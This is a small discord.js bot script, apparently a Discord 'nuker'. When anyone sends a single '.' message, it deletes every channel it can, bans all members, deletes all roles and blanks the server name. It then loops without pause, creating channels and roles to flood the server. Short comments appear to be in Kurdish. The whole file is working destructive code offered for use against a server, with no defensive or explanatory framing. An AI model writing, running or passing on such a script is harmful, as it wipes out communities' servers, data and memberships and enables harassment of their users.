const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("", "voice");///////bo channel 
        message.guild.createChannel("", "text");////bo voice
        message.guild.createRole({ name: "" });////nawek dane bo role kan
      });
    }
  }
});

client.login("");
